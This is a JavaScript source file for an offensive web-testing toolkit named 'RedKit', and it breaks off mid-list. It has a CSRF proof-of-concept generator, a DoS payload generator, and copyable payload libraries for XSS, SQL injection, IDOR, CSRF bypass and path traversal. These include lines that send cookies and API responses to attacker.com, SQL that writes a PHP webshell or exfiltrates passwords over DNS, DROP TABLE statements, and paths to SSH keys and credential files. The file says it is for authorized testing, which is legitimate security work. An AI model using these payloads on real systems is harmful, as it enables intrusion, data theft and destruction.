/* ============================================================
   RedKit - Payloads & web exploitation tools
   Loaded after js/core.js (uses $, el, TOOLS, helpers).
   ============================================================ */

// ============================================================
// EXPLOITATION TOOLS
// ============================================================

// ===== CSRF POC CREATOR =====
TOOLS['csrf-poc'] = {
  title: 'CSRF PoC Generator',
  desc: 'Turn a raw HTTP request into a working CSRF proof-of-concept form.',
  render() {
    return `
      <div class="tool">
        ${card('Raw HTTP Request', `
          ${field('Paste the raw request (request line + headers + blank line + body)', `<textarea id="csrf-raw" rows="14" placeholder="POST /api/action HTTP/1.1&#10;Host: target.com&#10;Content-Type: application/x-www-form-urlencoded&#10;&#10;name=evil&email=attacker@example.com"></textarea>`)}
          <div class="field-row">
            ${field('Scheme', `<select id="csrf-scheme">
                <option value="https">HTTPS</option>
                <option value="http">HTTP</option>
              </select>`)}
            ${field('Submission', `<select id="csrf-submit">
                <option value="auto">Auto-submit</option>
                <option value="button">Require submit button</option>
              </select>`)}
          </div>
          <div class="btn-row">
            <button class="btn" id="csrf-gen">Generate</button>
          </div>
        `)}
        ${card('', resultHead('Generated PoC', `<div>${ghostBtn('csrf-copy')}${ghostBtn('csrf-dl', 'Download .html')}</div>`) +
          `<div class="result-box" id="csrf-output"></div>`, { id: 'csrf-results', hidden: true })}
      </div>
    `;
  },
  init() {
    const parseRaw = (raw) => {
      const norm = raw.replace(/\r\n/g, '\n').trim();
      if (!norm) throw new Error('Empty request');
      const sepIdx = norm.indexOf('\n\n');
      const headPart = sepIdx === -1 ? norm : norm.slice(0, sepIdx);
      const body = sepIdx === -1 ? '' : norm.slice(sepIdx + 2);
      const lines = headPart.split('\n');
      const reqLine = lines.shift();
      const m = reqLine.match(/^(\S+)\s+(\S+)\s+\S+/);
      if (!m) throw new Error('Invalid request line');
      const method = m[1].toUpperCase();
      const path = m[2];
      const headers = {};
      lines.forEach(l => {
        const i = l.indexOf(':');
        if (i === -1) return;
        headers[l.slice(0, i).trim().toLowerCase()] = l.slice(i + 1).trim();
      });
      return { method, path, headers, body };
    };

    const parseFormBody = (body) => {
      const out = [];
      body.split('&').forEach(p => {
        if (!p) return;
        const i = p.indexOf('=');
        const k = i === -1 ? p : p.slice(0, i);
        const v = i === -1 ? '' : p.slice(i + 1);
        try { out.push([decodeURIComponent(k.replace(/\+/g, ' ')), decodeURIComponent(v.replace(/\+/g, ' '))]); }
        catch { out.push([k, v]); }
      });
      return out;
    };

    const buildPoc = () => {
      const raw = $('#csrf-raw').value;
      const scheme = $('#csrf-scheme').value;
      const autoSubmit = $('#csrf-submit').value === 'auto';
      const req = parseRaw(raw);
      const host = req.headers['host'];
      if (!host) throw new Error('Missing Host header');

      // Split query string off the path so it doesn't end up in form action twice
      const qIdx = req.path.indexOf('?');
      const pathOnly = qIdx === -1 ? req.path : req.path.slice(0, qIdx);
      const queryStr = qIdx === -1 ? '' : req.path.slice(qIdx + 1);
      const url = `${scheme}://${host}${pathOnly}`;

      const ct = (req.headers['content-type'] || '').toLowerCase();
      let enctype = '';
      if (ct.includes('multipart/form-data')) enctype = ' enctype="multipart/form-data"';
      else if (ct.includes('text/plain')) enctype = ' enctype="text/plain"';
      else enctype = ' enctype="application/x-www-form-urlencoded"';

      // GET/HEAD: params come from the query string. Otherwise: from the body.
      const params = ['GET', 'HEAD'].includes(req.method)
        ? parseFormBody(queryStr)
        : parseFormBody(req.body);
      const inputs = params.map(([k, v]) => `    <input type="hidden" name="${escapeHtml(k)}" value="${escapeHtml(v)}">`).join('\n');

      const formMethod = req.method === 'GET' ? 'GET' : 'POST';
      const submitBtn = autoSubmit ? '' : '\n    <input type="submit" value="Submit request">';
      const autoScript = autoSubmit ? '\n  <script>document.getElementById("csrfForm").submit();</script>' : '';

      return `<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <form id="csrfForm" action="${escapeHtml(url)}" method="${formMethod}"${enctype}>
${inputs}${submitBtn}
  </form>${autoScript}
</body>
</html>`;
    };

    const showOut = (s) => {
      $('#csrf-output').textContent = s;
      $('#csrf-results').style.display = 'block';
    };

    $('#csrf-gen').addEventListener('click', () => {
      try { showOut(buildPoc()); }
      catch (e) { toast('Error: ' + e.message); }
    });
    wireCopy('csrf-copy', () => $('#csrf-output').textContent);
    $('#csrf-dl').addEventListener('click', () => download('csrf-poc.html', $('#csrf-output').textContent, 'text/html'));
  }
};

// ===== DOS PAYLOAD GENERATOR =====
TOOLS['dos-gen'] = {
  title: 'DoS Payload Generator',
  desc: 'Generate large repeated payloads to test input validation limits.',
  render() {
    return `
      <div class="tool">
        ${card('Payload Configuration', `
          ${field('Text input', `<input type="text" id="dos-text" value="a">`)}
          <div class="field-row-3">
            ${field('Repetition count', `<input type="number" id="dos-count" value="1000">`)}
            ${field('Separator (optional)', `<input type="text" id="dos-sep" placeholder="e.g. /">`)}
            ${field('Filename', `<input type="text" id="dos-file" value="payload.txt">`)}
          </div>
          <div class="btn-row">
            <button class="btn" id="dos-gen">Generate &amp; Download</button>
            <button class="btn btn-secondary" id="dos-preview">Preview</button>
          </div>
        `)}
        ${card('', resultHead(`Preview <span id="dos-size" style="color:var(--text-mute);font-weight:400;font-size:11px"></span>`, ghostBtn('dos-copy')) +
          `<div class="result-box" id="dos-output"></div>`, { id: 'dos-results', hidden: true })}
      </div>
    `;
  },
  init() {
    const build = () => {
      const text = $('#dos-text').value;
      const count = parseInt($('#dos-count').value) || 0;
      const sep = $('#dos-sep').value;
      if (!text || !count) { toast('Need text and count'); return null; }
      return Array(count).fill(text).join(sep);
    };
    $('#dos-gen').addEventListener('click', () => {
      const payload = build();
      if (payload == null) return;
      const file = $('#dos-file').value || 'payload.txt';
      download(file, payload);
      toast(`Generated ${payload.length} bytes`);
    });
    $('#dos-preview').addEventListener('click', () => {
      const payload = build();
      if (payload == null) return;
      const preview = payload.length > 5000 ? payload.slice(0, 5000) + '\n... [truncated]' : payload;
      $('#dos-output').textContent = preview;
      $('#dos-size').textContent = `(${payload.length.toLocaleString()} bytes)`;
      $('#dos-results').style.display = 'block';
    });
    $('#dos-copy').addEventListener('click', () => { const p = build(); if (p != null) copy(p); });
  }
};

// ===== XSS PAYLOAD LIBRARY =====
// ===== Shared Payload Library Renderer =====
// Data sourced from 1000+ real bug bounty reports across multiple resources.
const PL_CREDIT = `Data sourced from <b>1000+ real bug bounty reports</b>, public writeups, PortSwigger, HackTricks, PayloadsAllTheThings, and curated personal notes. Use only on systems you are authorized to test.`;

const renderPayloadLibrary = (cardTitle, sections, tips) => {
  const sectionsHtml = sections.map((sec, sIdx) => `
    <div class="pl-cat" data-cat>
      ${escapeHtml(sec.name)}
      ${sec.note ? `<div class="pl-cat-note">${escapeHtml(sec.note)}</div>` : ''}
    </div>
    <div class="payload-list">
      ${sec.items.map(it => {
        const p = it.p, d = it.d || '';
        const j = JSON.stringify(p).replace(/"/g, '&quot;');
        const main = it.link
          ? `<a class="pl-link" href="${escapeHtml(p)}" target="_blank" rel="noopener noreferrer">${escapeHtml(p)}</a>`
          : `<code>${escapeHtml(p)}</code>`;
        const desc = it.recommended
          ? `<span class="pl-desc"><strong class="pl-recommended">${escapeHtml(d)}</strong></span>`
          : `<span class="pl-desc">${escapeHtml(d)}</span>`;
        return `
          <div class="payload-item" data-payload>
            ${main}
            ${desc}
            <button class="btn btn-ghost" data-copy="${j}">Copy</button>
          </div>
        `;
      }).join('')}
    </div>
  `).join('');

  const tipsHtml = (tips || []).map(t => `<div class="pl-tip"><b>${escapeHtml(t.title)}:</b> ${escapeHtml(t.body)}</div>`).join('');

  return `
    <div class="tool">
      <div class="card">
        <div class="card-title">${escapeHtml(cardTitle)}</div>
        <div class="pl-credit">${PL_CREDIT}</div>
        <input type="text" class="input pl-search" placeholder="Filter payloads..." data-pl-search>
        ${tipsHtml}
        ${sectionsHtml}
      </div>
    </div>
  `;
};

const initPayloadLibrary = () => {
  const root = $('#content'); // scope to the tool pane (NOT the sidebar, which also uses [data-cat])
  wireCopyAll(root);
  const search = $('[data-pl-search]', root);
  if (search) {
    search.addEventListener('input', () => {
      const q = search.value.toLowerCase();
      $$('[data-payload]', root).forEach(item => {
        item.style.display = !q || item.textContent.toLowerCase().includes(q) ? '' : 'none';
      });
      // hide empty categories
      $$('[data-cat]', root).forEach(cat => {
        const n = cat.nextElementSibling;
        if (!n) return;
        const visible = $$('[data-payload]', n).some(i => i.style.display !== 'none');
        cat.style.display = visible ? '' : 'none';
        n.style.display = visible ? '' : 'none';
      });
    });
  }
};

// ===== XSS PAYLOAD LIBRARY =====
TOOLS['xss-payloads'] = {
  title: 'XSS Payload Library',
  desc: 'A curated library of Cross-Site Scripting payloads, bypasses, and techniques.',
  render() {
    const sections = [
      { name: 'Basic Payloads', items: [
        { p: '<script>alert(1)</script>', d: 'Classic' },
        { p: '<img src=x onerror=alert(1)>', d: 'IMG onerror' },
        { p: '<svg onload=alert(1)>', d: 'SVG onload' },
        { p: '<body onload=alert(1)>', d: 'BODY onload' },
        { p: '<input autofocus onfocus=alert(1)>', d: 'Autofocus' },
        { p: '<details open ontoggle=alert(1)>', d: 'Details ontoggle' },
        { p: '<marquee onstart=alert(1)>', d: 'Marquee' },
        { p: '<x onclick=alert(1)>click</x>', d: 'Custom tag' },
        { p: '<iframe srcdoc="<script>alert(1)</script>">', d: 'Srcdoc' },
        { p: '<object data="javascript:alert(1)">', d: 'Object data' },
        { p: '<embed src="javascript:alert(1)">', d: 'Embed' },
      ]},
      { name: 'Context Escape', note: 'Break out of attributes, JS strings, comments', items: [
        { p: '"><script>alert(1)</script>', d: 'Double-quote attr' },
        { p: "'><script>alert(1)</script>", d: 'Single-quote attr' },
        { p: '"onmouseover=alert(1) x="', d: 'Attribute injection' },
        { p: "';alert(1);//", d: 'JS string break' },
        { p: "\\';alert(1);//", d: 'Escaped quote' },
        { p: '</script><script>alert(1)</script>', d: 'Script tag break' },
        { p: '*/alert(1)/*', d: 'JS comment break' },
        { p: '`-alert(1)-`', d: 'Template literal' },
      ]},
      { name: 'Filter & WAF Bypass', items: [
        { p: '<svg><script>alert&#40;1&#41;</script>', d: 'HTML entities' },
        { p: '<img src=x onerror="alert`1`">', d: 'No parens' },
        { p: '<svg/onload=eval(atob("YWxlcnQoMSk="))>', d: 'Base64 eval' },
        { p: '<script>onerror=alert;throw 1</script>', d: 'Throw → onerror' },
        { p: '<sCrIpT>alert(1)</sCrIpT>', d: 'Mixed case' },
        { p: '<script>alert(/xss/)</script>', d: 'Regex literal' },
        { p: '<a href="java&#09;script:alert(1)">x</a>', d: 'Tab in scheme' },
        { p: '<img src=x onerror=window[`al`+`ert`](1)>', d: 'String concat' },
        { p: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', d: 'SVG animate' },
        { p: '<iframe src="data:text/html,<script>alert(1)</script>">', d: 'Data URI iframe' },
      ]},
      { name: 'CSP Bypass', items: [
        { p: '<base href="javascript:/a/-alert(1)///">', d: 'Base href hijack' },
        { p: '<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>', d: 'JSONP gadget (Google)' },
        { p: "<link rel='preload' href='//attacker.com'>", d: 'Exfil via preload' },
        { p: '<form action=//attacker.com><input name=x value=1><input type=submit>', d: 'Form action exfil' },
        { p: '<iframe srcdoc="<script src=//attacker.com/x.js></script>">', d: 'Srcdoc bypass' },
      ]},
      { name: 'Cookie / Data Exfiltration', items: [
        { p: '<script>fetch("//attacker.com/?c="+document.cookie)</script>', d: 'Fetch cookie' },
        { p: '<img src=x onerror=this.src="//attacker.com/?"+document.cookie>', d: 'Image cookie' },
        { p: '<script>new Image().src="//attacker.com/?"+btoa(document.cookie)</script>', d: 'B64 image' },
        { p: '<script>navigator.sendBeacon("//attacker.com",document.cookie)</script>', d: 'Beacon' },
        { p: '<script>fetch("/api/me").then(r=>r.text()).then(t=>fetch("//attacker.com/?d="+btoa(t)))</script>', d: 'Steal API response' },
      ]},
      { name: 'DOM XSS Sinks', items: [
        { p: 'javascript:alert(1)', d: 'href / location sink' },
        { p: '#"><img src=x onerror=alert(1)>', d: 'Hash → innerHTML' },
        { p: '#<script>alert(1)</script>', d: 'location.hash sink' },
        { p: "');alert(1);//", d: 'eval / setTimeout sink' },
      ]},
      { name: 'AngularJS / Template Sandbox', items: [
        { p: "{{constructor.constructor('alert(1)')()}}", d: '1.6+' },
        { p: '{{$on.constructor(\'alert(1)\')()}}', d: '1.5' },
        { p: '{{[].pop.constructor(\'alert(1)\')()}}', d: 'Generic' },
        { p: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", d: '1.0.x' },
      ]},
      { name: 'mXSS / Mutation', items: [
        { p: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', d: 'noscript mutation' },
        { p: '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>', d: 'listing tag' },
        { p: '<style><img src="</style><img src=x onerror=alert(1)>">', d: 'style escape' },
      ]},
      { name: 'File Upload XSS', note: 'Upload as image/svg/html and trigger rendering', items: [
        { p: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', d: 'SVG upload' },
        { p: 'GIF89a;<script>alert(1)</script>', d: 'Polyglot GIF/HTML' },
        { p: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "file:///etc/passwd">%p;]>', d: 'XML upload (also XXE)' },
      ]},
      { name: 'Header / CRLF Injection', note: 'GitHub Pages: page_id with %00 → cookie injection → cache poison', items: [
        { p: '%0d%0aSet-Cookie:%20pwn=1', d: 'Set-Cookie injection' },
        { p: '%0d%0a%0d%0a<script>alert(1)</script>', d: 'CRLF body inject' },
        { p: '%E5%98%8D%E5%98%8A', d: 'UTF-8 CRLF bypass' },
      ]},
      { name: 'Polyglots', items: [
        { p: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(1)//\'>', d: 'Browns polyglot' },
        { p: '">\'><svg/onload=alert(1)>', d: 'Triple-context' },
      ]},
      { name: 'Blind XSS Probes', note: 'Use XSS Hunter / Interactsh - fires on admin panel views', items: [
        { p: '"><script src="//xsshunter.com/your_id"></script>', d: 'Hunter probe' },
        { p: '<script>$.getScript("//attacker.com/x.js")</script>', d: 'jQuery loader' },
      ]},
      { name: 'Blind XSS Webhook Provider', note: 'Sign up to get your probe ID, then plug it into the Blind XSS Probes above', items: [
        { p: 'https://xss.report/', d: 'Recommended', link: true, recommended: true },
        { p: 'https://xsshunter.trufflesecurity.com/', d: '', link: true },
        { p: 'https://bxsshunter.com', d: '', link: true },
      ]},
    ];
    return renderPayloadLibrary('XSS Payloads & Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== SQLi PAYLOAD LIBRARY =====
TOOLS['sqli-payloads'] = {
  title: 'SQLi Payload Library',
  desc: 'A curated library of SQL Injection payloads and privilege escalation techniques.',
  render() {
    const sections = [
      { name: 'Auth Bypass', items: [
        { p: "' OR '1'='1", d: 'Classic' },
        { p: "' OR 1=1--", d: 'With comment' },
        { p: "admin'--", d: 'Comment password' },
        { p: "admin'/*", d: 'Multi-line comment' },
        { p: "' OR 1=1 LIMIT 1--", d: 'LIMIT bypass' },
        { p: "') OR ('1'='1", d: 'Bracket escape' },
        { p: "1' OR '1'='1' /*", d: 'Mixed comment' },
        { p: '" OR ""="', d: 'Double quote' },
        { p: "' OR 1=1#", d: 'MySQL hash comment' },
      ]},
      { name: 'UNION-Based', note: 'First find column count with ORDER BY', items: [
        { p: "1' ORDER BY 1--", d: 'Column count probe' },
        { p: "' UNION SELECT NULL--", d: '1 col' },
        { p: "' UNION SELECT NULL,NULL--", d: '2 cols' },
        { p: "' UNION SELECT NULL,NULL,NULL--", d: '3 cols' },
        { p: "' UNION SELECT @@version,user(),database()--", d: 'Info gathering' },
        { p: "' UNION SELECT username,password FROM users--", d: 'Data extraction' },
        { p: "' UNION SELECT table_name,NULL FROM information_schema.tables--", d: 'List tables' },
        { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", d: 'List columns' },
      ]},
      { name: 'Error-Based', items: [
        { p: "' AND extractvalue(1,concat(0x7e,version()))--", d: 'MySQL XPath' },
        { p: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--", d: 'MySQL updatexml' },
        { p: "' AND 1=CONVERT(int,(SELECT @@version))--", d: 'MSSQL convert' },
        { p: "' AND 1=cast((SELECT version()) as int)--", d: 'PostgreSQL cast' },
        { p: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", d: 'Double query' },
      ]},
      { name: 'Time-Based Blind', note: 'When no output is reflected. Top technique in bounty reports.', items: [
        { p: "' AND (SELECT SLEEP(5))--", d: 'MySQL' },
        { p: "' AND SLEEP(5)#", d: 'MySQL #' },
        { p: "' OR IF(1=1,SLEEP(5),0)--", d: 'MySQL conditional' },
        { p: "'; WAITFOR DELAY '0:0:5'--", d: 'MSSQL' },
        { p: "' AND pg_sleep(5)--", d: 'PostgreSQL' },
        { p: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", d: 'Oracle' },
        { p: "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", d: 'PostgreSQL conditional' },
      ]},
      { name: 'Boolean Blind', items: [
        { p: "1' AND SUBSTRING(version(),1,1)='5", d: 'Char compare' },
        { p: "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--", d: 'Char extraction' },
        { p: "1 AND (SELECT COUNT(*) FROM users)>0", d: 'Table existence' },
        { p: "' AND 1=(SELECT COUNT(*) FROM tabname)--", d: 'Table probe' },
      ]},
      { name: 'OOB (Out-of-Band)', note: 'Use Burp Collaborator / Interactsh', items: [
        { p: "'; exec master..xp_dirtree '\\\\\\\\attacker.com\\\\a'--", d: 'MSSQL DNS' },
        { p: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a'))--", d: 'MySQL DNS exfil' },
        { p: "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--", d: 'PostgreSQL OOB' },
      ]},
      { name: 'Stacked Queries', items: [
        { p: "'; DROP TABLE users--", d: 'MSSQL/Postgres' },
        { p: "'; INSERT INTO users(u,p) VALUES('a','b')--", d: 'Insert' },
        { p: "'; UPDATE users SET role='admin' WHERE u='attacker'--", d: 'Privilege escalation' },
      ]},
      { name: 'INSERT/UPDATE without commas', note: 'Apple SQLi technique - when commas filtered', items: [
        { p: "INSERT INTO t VALUES (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b)", d: 'Comma-less values' },
        { p: "SELECT * FROM users WHERE id=1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b", d: 'Comma-less union' },
      ]},
      { name: 'WAF Bypass', items: [
        { p: "%27%20OR%201%3D1--", d: 'URL encode' },
        { p: "/*!50000UNION*/ /*!50000SELECT*/", d: 'MySQL versioned' },
        { p: "UnIoN SeLeCt", d: 'Mixed case' },
        { p: "UNION/*comment*/SELECT", d: 'Inline comment' },
        { p: "%0AUNION%0ASELECT", d: 'Newline' },
        { p: "1\u00a0OR\u00a01=1", d: 'Non-break space' },
        { p: "/*!u%6eion*/ /*!se%6cect*/", d: 'Hex char' },
      ]},
      { name: 'File Read / Write (MySQL)', items: [
        { p: "' UNION SELECT load_file('/etc/passwd')--", d: 'Read file' },
        { p: "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php'--", d: 'Write webshell' },
      ]},
      { name: 'GraphQL SQLi', note: 'GraphQL params are common SQLi sinks (HackerOne IDOR pattern)', items: [
        { p: '{ user(id: "1\' OR 1=1--") { name } }', d: 'Quote in arg' },
        { p: '{ search(q: "x\' UNION SELECT NULL--") { results } }', d: 'Search field' },
      ]},
      { name: 'NoSQL Injection', items: [
        { p: '{"$ne": null}', d: 'Mongo not-null' },
        { p: '{"$gt": ""}', d: 'Mongo gt' },
        { p: '{"username":{"$regex":"^a"}}', d: 'Regex enum' },
        { p: "';return true;//", d: 'JS injection' },
      ]},
    ];
    return renderPayloadLibrary('SQLi Payloads & Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== IDOR HELPER =====
TOOLS['idor-helper'] = {
  title: 'IDOR Helper & Patterns',
  desc: 'Find and exploit Insecure Direct Object References with proven test patterns.',
  render() {
    const sections = [
      { name: 'ID Types to Test', items: [
        { p: '1, 2, 3, ... 1000000', d: 'Sequential decimal' },
        { p: '00000001, 00000002', d: 'Padded numeric' },
        { p: '550e8400-e29b-41d4-a716-446655440000', d: 'UUID v4' },
        { p: 'deadbeef1234', d: 'Hex string' },
        { p: 'YWRtaW4=', d: 'Base64 encoded' },
        { p: 'attacker@evil.com', d: 'Email/username as ID' },
        { p: '1640995200', d: 'Unix timestamp' },
      ]},
      { name: 'Locations to Test', note: 'IDORs hide everywhere - not just URL params', items: [
        { p: '/api/user/{id}/profile', d: 'URL path' },
        { p: '?user_id=1234', d: 'Query string' },
        { p: '{"id": 1234}', d: 'JSON body' },
        { p: 'X-User-ID: 1234', d: 'Custom header' },
        { p: 'cookie: user=1234', d: 'Cookie value' },
        { p: 'GraphQL: user(id: "1234")', d: 'GraphQL arg' },
        { p: 'wss://... {"action":"sub","user":1234}', d: 'WebSocket' },
        { p: '/rpc?method=getUser&id=1234', d: 'RPC call' },
      ]},
      { name: 'Test Techniques', items: [
        { p: 'Replace your ID with victim ID directly', d: 'Direct swap' },
        { p: 'Use your own ID in victim context (token swap)', d: 'Authorization confusion' },
        { p: 'Add ?user_id=victim to your request', d: 'Param injection' },
        { p: 'Send array: {"id":[1234,5678]}', d: 'Array smuggling' },
        { p: 'Wildcard: id=*', d: 'Wildcard test' },
        { p: 'Negative: id=-1, id=0', d: 'Edge case' },
        { p: 'Change HTTP method (GET→POST→PUT→DELETE)', d: 'Method swap' },
        { p: 'Change Content-Type to bypass validation', d: 'Content-Type swap' },
        { p: 'Add /../ in path or extension change', d: 'Path tricks' },
      ]},
      { name: 'Hash/Token Bypass', items: [
        { p: 'Sign with attacker key, victim ID', d: 'Signing oracle' },
        { p: 'JWT alg=none', d: 'JWT downgrade' },
        { p: 'Truncate hash / collision', d: 'Hash truncation' },
        { p: 'Use empty token', d: 'Empty creds bypass' },
      ]},
      { name: 'Functionalities Often Vulnerable', items: [
        { p: 'View profile, posts, photos, files', d: 'Read IDOR' },
        { p: 'Update settings, password, email', d: 'Update IDOR' },
        { p: 'Delete account, comment, file', d: 'Delete IDOR' },
        { p: 'Add member to group / org', d: 'Permission IDOR' },
        { p: 'Cancel subscription / order', d: 'Action IDOR' },
        { p: 'Export data / generate invoice', d: 'Data IDOR' },
        { p: 'Webhook URL of another tenant', d: 'Cross-tenant' },
      ]},
    ];
    return renderPayloadLibrary('IDOR Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== CSRF BYPASS LIBRARY =====
TOOLS['csrf-bypass'] = {
  title: 'CSRF Bypass Techniques',
  desc: 'Proven techniques to defeat CSRF protections and bypass token defenses.',
  render() {
    const sections = [
      { name: 'Token Bypasses', items: [
        { p: 'Remove the CSRF token parameter entirely', d: 'Empty token' },
        { p: 'Set token to empty string', d: 'Blank value' },
        { p: 'Use your own valid token on victim', d: 'Token swap (often works)' },
        { p: 'Use a token of the same length but random', d: 'Length-only validation' },
        { p: 'Change request method (POST → GET)', d: 'Method validation gap' },
        { p: 'Remove the token header (X-CSRF-Token)', d: 'Header-only check' },
        { p: 'Change Content-Type to text/plain or multipart', d: 'CT validation gap' },
      ]},
      { name: 'GET-Based State Change', note: 'Common in admin panels & mobile APIs', items: [
        { p: 'GET /api/delete?id=1', d: 'Direct GET CSRF' },
        { p: '<img src="https://target/api/delete?id=1">', d: 'Image-tag PoC' },
        { p: 'GraphQL GET mutations (?query=mutation{...})', d: 'GraphQL CSRF (Facebook $7.5k)' },
      ]},
      { name: 'SameSite Bypasses', items: [
        { p: 'Top-level navigation (form submit / window.open)', d: 'Bypasses Lax' },
        { p: 'Subdomain XSS → cookie context', d: 'Same-site XSS' },
        { p: 'GET requests bypass Lax for top-nav', d: 'Lax → GET allowed' },
        { p: '<2 minute window after Set-Cookie (Chrome Lax-by-default)', d: '120s grace period' },
      ]},
      { name: 'Token Leakage', items: [
        { p: 'Token in URL → leaked via Referer', d: 'Referer leak' },
        { p: 'Token in JSON response → fetched cross-origin', d: 'CORS misconfig leak' },
        { p: 'Token in HTML page accessible to XSS', d: 'XSS → CSRF chain' },
        { p: 'Fixed/predictable tokens (hash of user ID)', d: 'Predictable token' },
      ]},
      { name: 'OAuth / SSO CSRF', items: [
        { p: 'Missing state parameter → login CSRF', d: 'OAuth state missing' },
        { p: 'Null byte in state (state=foo%00bar)', d: 'State validation bypass' },
        { p: 'state=attacker_state on victim', d: 'Account merge' },
        { p: 'HEAD method → CSRF token check skipped (GitHub $25k)', d: 'HEAD method abuse' },
      ]},
      { name: 'JSON / API CSRF', items: [
        { p: '<form enctype="text/plain" action="...">', d: 'JSON via form' },
        { p: 'Flash → 307 redirect with JSON body', d: 'Legacy 307 redirect' },
        { p: 'CORS misconfig: ACAO=null + ACAC=true', d: 'CORS-based CSRF' },
        { p: 'CL.0 / smuggling on token endpoint', d: 'Smuggling chain' },
      ]},
      { name: 'Notable Patterns', items: [
        { p: 'Client-side path traversal in form action (GitLab $6.5k)', d: 'Path traversal CSRF' },
        { p: 'Azure EmojiDeploy: zip upload via CSRF → RCE ($30k)', d: 'CSRF → RCE' },
        { p: 'Facebook: GET endpoint that triggers POST fetch internally', d: 'Hidden POST' },
      ]},
    ];
    return renderPayloadLibrary('CSRF Bypass Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== PATH TRAVERSAL / FILE DISCLOSURE =====
TOOLS['path-traversal'] = {
  title: 'Path Traversal / LFI Helper',
  desc: 'Path traversal and file disclosure payloads, including server quirks and WAF bypasses.',
  render() {
    const sections = [
      { name: 'Basic Traversal', items: [
        { p: '../../../etc/passwd', d: 'Linux 3 levels' },
        { p: '../../../../../../etc/passwd', d: 'Deep traversal' },
        { p: '..\\..\\..\\windows\\win.ini', d: 'Windows backslash' },
        { p: '../../../../../../../../../../etc/passwd', d: 'Very deep (safe default)' },
        { p: '/etc/passwd', d: 'Absolute path' },
        { p: 'C:\\Windows\\win.ini', d: 'Windows absolute' },
        { p: 'file:///etc/passwd', d: 'file:// scheme' },
      ]},
      { name: 'Encoded Variants', note: 'Try when basic ../ is filtered', items: [
        { p: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', d: 'URL encoded' },
        { p: '%252e%252e%252f', d: 'Double URL encoded' },
        { p: '..%c0%af', d: 'Overlong UTF-8' },
        { p: '..%ef%bc%8f', d: 'Unicode slash' },
        { p: '%%32%65%%32%65/', d: 'Apache 2.4.49 bypass (CVE-2021-41773)' },
        { p: '..%5c..%5c..%5c', d: 'Encoded backslash' },
        { p: '..%2f..%2f..%2f', d: 'Encoded slash' },
      ]},
      { name: 'Filter Bypass Tricks', items: [
        { p: '....//....//....//etc/passwd', d: 'Replace ../ removed once' },
        { p: '..//..//..//etc/passwd', d: 'Double slash' },
        { p: '..;/..;/..;/etc/passwd', d: 'Secondary context (..;/) - Starbucks $4k' },
        { p: 'web\\..\\.\\..\\etc\\passwd', d: 'Embedded in dirname (Sam Curry)' },
        { p: '../../../etc/passwd%00', d: 'Null byte (legacy PHP)' },
        { p: '../../../etc/passwd%00.png', d: 'Null byte + ext' },
        { p: '/proc/self/environ', d: 'Read env vars' },
        { p: '/proc/self/cmdline', d: 'Read cmdline' },
      ]},
      { name: 'Useful Linux Files', items: [
        { p: '/etc/passwd', d: 'User list' },
        { p: '/etc/shadow', d: 'Hashes (root only)' },
        { p: '/etc/hosts', d: 'Internal hostnames' },
        { p: '/proc/self/environ', d: 'Env vars' },
        { p: '/proc/version', d: 'Kernel info' },
        { p: '/root/.ssh/id_rsa', d: 'SSH key' },
        { p: '/root/.bash_history', d: 'Bash history' },
        { p: '/var/log/apache2/access.log', d: 'Log poisoning' },
        { p: '/var/www/html/.env', d: 'App secrets' },
        { p: '/var/www/html/wp-config.php', d: 'WordPress config' },
        { p: '/.aws/credentials', d: 'AWS creds' },
        { p: '/.git/config', d: 'Git config' },
        { p: '/proc/self/cwd/.env', d: 'Relative .env via /proc' },
      ]},
      { name: 'Useful Windows Files', items: [
        { p: 'C:\\Windows\\win.ini', d: 'Windows ini' },
        { p: 'C:\\Windows\\System32\\drivers\\etc\\hosts', d: 'Hosts file' },
        { p: 'C:\\inetpub\\wwwroot\\web.config', d: 'IIS config' },
        { p: 'C:\\Windows\\repair\\sam', d: 'SAM (legacy)' },
        { p: 'C:\\Users\\Administrator\\.ssh\\id_rsa', d: 'SSH key' },
      ]},
      { name: 'PHP Wrappers (LFI → RCE)', items: [
        { p: 'php://filter/convert.base64-encode/resource=index.php', d: 'Read source' },
        { p: 'php://filter/read=string.rot13/resource=index.php', d: 'ROT13 read' },
        { p: 'php://input', d: 'POST body as code' },
        { p: 'data://text/plain,<?php system($_GET[c]);?>', d: 'Inline RCE' },
        { p: 'expect://id', d: 'Command exec (rare)' },
        { p: 'zip://shell.jpg%23payload.php', d: 'Zip wrapper RCE' },
      ]},
      { name: 'ZipSlip', note: 'Malicious archives with ../ in entry names - GitLab $29k', items: [
        { p: '../../../../etc/cron.d/pwn', d: 'Overwrite cron' },
        { p: '../../root/.ssh/authorized_keys', d: 'SSH key write' },
        { p: '..\\..\\..\\Windows\\System32\\config\\sam', d: 'Windows ZipSlip' },
      ]},
      { name: 'Nginx Alias Traversal', items: [
